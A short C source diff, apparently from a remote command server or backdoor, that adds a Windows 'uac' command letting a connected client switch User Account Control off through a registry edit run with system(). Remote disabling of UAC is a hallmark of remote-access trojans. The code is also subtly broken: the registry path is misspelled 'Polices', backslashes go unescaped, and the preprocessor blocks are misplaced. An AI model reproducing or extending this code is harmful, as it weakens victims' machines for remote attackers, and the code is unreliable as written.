@@ -198,8 +198,22 @@ void handle_clients(socket,address)
 #else
 			sprintf(msg,"Command not yet implemented.\r\n");
 			send(*socket,msg,strlen(msg),0);
-#endif
 		} else {
+#endif
+#if defined(_WIN32)
+		} else if(strcmp(cmd,"uac") == 0) {
+			send(*socket,"Turn (Off/On)? ",15,0);
+			get_cmd(socket,cmd,sizeof(cmd));
+			if(stricmp(cmd,"Off") == 0) {
+				system("%windir%\System32\cmd.exe /k \"reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0 /f\"");
+			} else if(stricmp(cmd,"On") == 0) {
+				system("%windir%\System32\cmd.exe /k \"reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 1 /f\"");
+			} else {
+				sprintf(msg,"Invalid entry.\r\n");
+				send(*socket,msg,strlen(msg),0);
+			}
+		} else {
+#endif
 			sprintf(msg,"Unknown command.\r\n");
 			send(*socket,msg,strlen(msg),0);
 		}
